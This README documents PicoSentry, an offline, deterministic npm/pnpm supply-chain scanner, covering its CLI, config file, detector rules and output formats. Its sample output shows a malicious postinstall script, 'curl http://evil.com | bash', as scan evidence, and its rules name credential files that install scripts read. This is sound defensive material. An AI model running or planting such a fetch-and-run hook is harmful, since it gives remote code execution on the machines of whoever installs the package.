# PicoSentry 🦞

**Deterministic, offline supply-chain scanner for npm/pnpm — safe for ML pipelines.**

Same inputs + same corpus version = same output. Every time.

No HTTP at scan time. No probabilistic heuristics. No narrative in findings.

## Quick Start

```bash
# Install
pip install -e .

# Scan a project
picosentry scan ./my-project

# JSON output (deterministic, sorted keys)
picosentry scan ./my-project --format json

# SARIF output (for CI/GitHub)
picosentry scan ./my-project --format sarif

# ML-context output (compact, token-budgeted, for LLM tool results)
picosentry scan ./my-project --format ml-context

# Specific rules only
picosentry scan ./my-project --rules L2-POST-001 L2-TYPO-001

# Exit code for CI (1 = findings, 0 = clean)
picosentry scan ./my-project --exit-code

# Only fail CI on HIGH or CRITICAL findings
picosentry scan ./my-project --fail-on high

# Baseline filtering — suppress known findings (CI adoption)
picosentry scan ./my-project --baseline baseline.json

# Update baseline after accepting new findings
picosentry scan ./my-project --baseline baseline.json --baseline-update

# Simple ignore file format (one rule per line, # comments)
picosentry scan ./my-project --baseline ignore.txt

# Quiet mode — summary only, no detailed findings (CI-friendly)
picosentry scan ./my-project --quiet --exit-code

# One-line summary for Slack/Teams notifications
picosentry scan ./my-project --summary

# Filter output to HIGH and above (for reports)
picosentry scan ./my-project --severity-threshold high --format json

# List rules
picosentry rules

# Update corpus (ONLY command that makes network requests)
picosentry update

# Verify determinism — compare two scan JSON files
picosentry diff scan_a.json scan_b.json

# Version
picosentry version
```

## Claw Pinch Branding

Human-facing table output uses lobster-themed severity labels:

| Standard Severity | PicoSentry Label |
|-------------------|------------------|
| CRITICAL / HIGH   | HARD PINCH 🦞    |
| MEDIUM            | SOFT PINCH       |
| LOW / INFO        | NUDGE            |

Clean scan: **"No pinches. All clear. 🦞"**

Machine formats (JSON, SARIF, ml-context) use standard severity labels for CI/CD compatibility.

## Design Principles

1. **Deterministic by construction**: `sha256(scan_a) == sha256(scan_b)` on identical inputs + corpus version
2. **Offline at scan time**: No HTTP calls during scanning. Corpus is local and versioned.
3. **Pure functions**: Rules are `(target_path, corpus_dir) → List[Finding]`. No global state, no randomness.
4. **No narrative in findings**: Output is structured data. The consumer formats.
5. **ML-safe**: `--format ml-context` produces compact, token-budgeted output designed for LLM tool results.

## Configuration File

PicoSentry reads `.picosentry.yml` from the target directory (or `.picosentry.yaml` / `picosentry.config.yml`). Config file values are defaults; CLI flags override them.

```yaml
version: 1

# Output format: json, sarif, table, ml-context
format: json

# Disable colored output
no_color: true

# Exit with code 1 if findings found
exit_code: true

# Only fail CI on HIGH or above
fail_on: high

# Suppress known findings from previous scan
baseline: baseline.json

# Severity overrides — downgrade/upgrade rule severity
severity_overrides:
  L2-PROV-001: INFO        # Downgrade provenance to info
  L2-FORK-001: LOW         # Downgrade fork drift
  L2-LICENSE-001: MEDIUM   # Ensure license is medium

# Ignore specific packages (skip all findings for these)
ignore_packages:
  - left-pad
  - core-js

# Ignore paths matching glob patterns
ignore_paths:
  - 'vendor/**'
  - '**/test/**'

# Run only specific rules
rules:
  - L2-POST-001
  - L2-TYPO-001
  - L2-OBFS-001

# Token budget for ml-context format
token_budget: 2048
```

### Config Precedence

1. CLI flags (highest priority)
2. `.picosentry.yml` config file
3. Built-in defaults

### Determinism Guarantee

Config file is part of scan inputs. Same config + same target + same corpus = same output.

## Detector Rules (15)

| Rule ID | Name | What it detects | Severity |
|---------|------|----------------|----------|
| L2-POST-001 | Post-install scripts | Packages with install/postinstall/preinstall lifecycle scripts (escalated to CRITICAL if network/credential/child_process) | CRITICAL/HIGH |
| L2-OBFS-001..004 | Obfuscation | eval(), Function(), hex strings, base64+eval, unicode escapes | CRITICAL/HIGH |
| L2-DEPC-001 | Dependency confusion | Internal-scoped packages without registry config | HIGH |
| L2-TYPO-001 | Typosquatting | Package names within edit distance 2 of top-327 packages (offline corpus) | HIGH |
| L2-MANI-001/002 | Manifest issues | Wildcard versions, optional deps with scripts | MEDIUM/HIGH |
| L2-FORK-001 | Fork drift | Fork/mirror/abandoned package indicators | MEDIUM |
| L2-CRED-001 | Credential reading | Install scripts that read ~/.npmrc, ~/.aws/, ~/.ssh/, .env, env vars | HIGH |
| L2-LOCK-001 | Lockfile drift | Version mismatches, missing lockfile, pnpm dangerouslyAllowAllBuilds | MEDIUM/HIGH |
| L2-BUND-001 | Bundled shadows | Hidden bundled dependencies (event-stream@3.3.6 attack vector) | HIGH |
| L2-PROV-001 | Provenance | Missing repository field, missing integrity hash, scripts without provenance | LOW/MEDIUM |
| L2-MAINT-001 | Maintainer change | Publisher/author mismatch, anonymous scripts, bus factor, domain transfer | MEDIUM/HIGH |
| L2-PNPM-001 | pnpm config | dangerouslyAllowAllBuilds, missing .npmrc, overrides, patchedDependencies | MEDIUM/CRITICAL |
| L2-LICENSE-001 | License compliance | Missing license, UNLICENSED, copyleft (GPL/AGPL/LGPL), unrecognized license | MEDIUM/HIGH/LOW |
| L2-ENGIN-001 | Engine constraints | Missing, overly permissive, or suspicious Node.js engine constraints | INFO/HIGH/MEDIUM/LOW |
| L2-SIDELOAD-001 | Protocol sideloading | Dependencies using git://, file:, link:, github: protocols that bypass registry integrity | CRITICAL/HIGH/MEDIUM |

## Determinism Test

### Baseline Filtering (CI Adoption)

When adopting PicoSentry in an existing project, you'll likely have known findings you don't want to fail CI on. Use `--baseline` to suppress them:

```bash
# First run: save full scan as baseline
picosentry scan ./my-project --format json -o baseline.json

# Subsequent runs: only NEW findings cause CI failure
picosentry scan ./my-project --baseline baseline.json --exit-code

# Accept new findings into baseline
picosentry scan ./my-project --baseline baseline.json --baseline-update
```

You can also use a simple ignore file:

```
# ignore.txt — one rule per line, # comments allowed
L2-POST-001                    # Suppress all post-install findings
L2-TYPO-001:reqct              # Suppress typosquat for specific package
L2-LICENSE-001:evil-pkg:evil/package.json  # Suppress exact finding
```

Baseline matching uses (rule_id, package, file) fingerprints:
- **Exact match**: all three fields match → suppressed
- **Partial match**: rule_id only → suppresses all findings for that rule
- **Partial match**: rule_id + package → suppresses all files for that package

The core thesis is validated by `TestDeterminism`:

```bash
python -m pytest tests/ -v
```

8 determinism tests:
- `test_scan_id_is_deterministic` — same target = same ID
- `test_scan_id_changes_with_different_target` — different targets = different IDs
- `test_json_output_is_deterministic` — `sha256(json_a) == sha256(json_b)`
- `test_findings_sort_order_is_deterministic` — findings sorted by (rule_id, package, file, line)
- `test_full_scan_is_deterministic` — end-to-end determinism check
- `test_ml_context_format_is_deterministic` — ML output is deterministic
- `test_no_random_ids_in_output` — no uuid4, no timestamps in findings
- `test_sorted_keys_in_json` — JSON keys are alphabetically sorted

### Diff Command

Verify determinism across two scan runs:

```bash
# Run scan twice and compare
picosentry scan ./project --format json -o scan_a.json
picosentry scan ./project --format json -o scan_b.json
picosentry diff scan_a.json scan_b.json

# Output: ✓ Scans are IDENTICAL — determinism verified
# Exit code: 0 = identical, 1 = different, 2 = error

# Verbose diff shows finding-level changes
picosentry diff scan_a.json scan_b.json --verbose
```

Note: `duration_ms` is excluded from comparison since timing is inherently non-deterministic.

## IoC Regression Tests

PicoSentry must detect all known IoCs from major npm supply chain attacks:

| IoC | Attack | Expected Detections |
|-----|--------|---------------------|
| event-stream@3.3.6 | Bundled flatmap-stream backdoor | L2-BUND-001, L2-PROV-001 |
| Shai-Hulud worm | Postinstall self-propagation | L2-POST-001, L2-CRED-001 |
| nx typosquat | Typosquat + postinstall RCE | L2-POST-001 |
| left-pad | Dependency chaos / single maintainer | L2-MAINT-001 |
| crossenv | Credential theft via postinstall | L2-POST-001, L2-TYPO-001 |
| ua-parser-js@7.7.8 | Account takeover + postinstall RCE | L2-POST-001 |
| colors.js@1.4.2 | Protestware infinite loop in postinstall | L2-POST-001 |

## Output Formats

### JSON (default for CI)
```json
{
  "corpus_version": "8207e7c4bdbe",
  "engine_version": "0.1.0",
  "findings": [...],
  "scan_id": "e4a3ab439f722f48",
  "stats": {...},
  "target": "/path/to/project"
}
```

### SARIF (for GitHub Code Scanning)
Standard SARIF 2.1.0 output compatible with GitHub Advanced Security.
Tool driver name: `picosentry`.

### Table (for humans)
```
🦞 PicoSentry
Target: /path/to/project
Engine: v0.1.0 | Corpus: v8207e7c4bdbe
Scan ID: e4a3ab439f722f48

Pinches by Severity:
  HARD PINCH  : 3
  SOFT PINCH  : 1
  NUDGE       : 2

Pinches:
  [HARD PINCH] L2-POST-001 evil-app@1.0.0
    File: evil/package.json
    Package declares 'postinstall' lifecycle script
    Evidence: scripts.postinstall = 'curl http://evil.com | bash'
    Confidence: EXACT

No pinches. All clear. 🦞
```

### ML-Context (for LLM tool results)
```
scan_id=e4a3ab439f722f48
corpus_version=8207e7c4bdbe
target=/path/to/project
findings=6

[CRITICAL] L2-POST-001 evil-app@1.0.0 evil/package.json | scripts.postinstall = 'curl...'
[HIGH] L2-TYPO-001 reqct /path/to/project/package.json | reqct ≈ react (distance=1)
```

Compact, structured, token-budgeted. No narrative. No severity word inflation.

## Architecture

```
picosentry/
├── __init__.py          # Version
├── __main__.py          # python -m picosentry entry
├── cli.py               # CLI (scan, rules, version, update, diff)
├── engine.py            # ScanEngine orchestrator
├── models.py            # Finding, ScanResult, ScanStats, BaselineResult (frozen dataclasses)
├── corpus/
│   ├── npm_top_packages.json  # 327 top npm packages (typosquat targets)
│   └── ioc/                    # IoC metadata (event-stream, Shai-Hulud, nx)
├── rules/
│   ├── post_install.py   # L2-POST-001
│   ├── obfuscation.py    # L2-OBFS-001..004
│   ├── dep_confusion.py  # L2-DEPC-001
│   ├── typosquat.py      # L2-TYPO-001
│   ├── manifest.py       # L2-MANI-001/002
│   ├── fork_drift.py     # L2-FORK-001
│   ├── credential_read.py # L2-CRED-001
│   ├── pnpm_lock_parser.py # pnpm-lock.yaml v6+ parser
│   ├── lockfile_drift.py  # L2-LOCK-001
│   ├── bundled_shadow.py  # L2-BUND-001
│   ├── provenance.py      # L2-PROV-001
│   ├── maintainer_change.py # L2-MAINT-001
│   ├── pnpm_config.py     # L2-PNPM-001
│   ├── license.py          # L2-LICENSE-001
│   └── engine.py            # L2-ENGIN-001
│   └── sideloading.py       # L2-SIDELOAD-001
├── formatters/
│   ├── json_fmt.py       # Deterministic JSON (sorted keys)
│   ├── sarif.py          # SARIF 2.1.0
│   ├── table.py          # Human-readable with claw pinch branding
│   └── ml_context.py     # Token-budgeted for LLM tool results
└── tests/
    ├── test_scanner.py         # Core scanner tests
    ├── test_cli.py             # CLI integration + SARIF validation
    ├── test_pnpm_lock_parser.py # pnpm lockfile parser tests
    ├── test_license.py         # License compliance tests
    └── fixtures/               # Test projects (IoC regression suite)
```

## License

MIT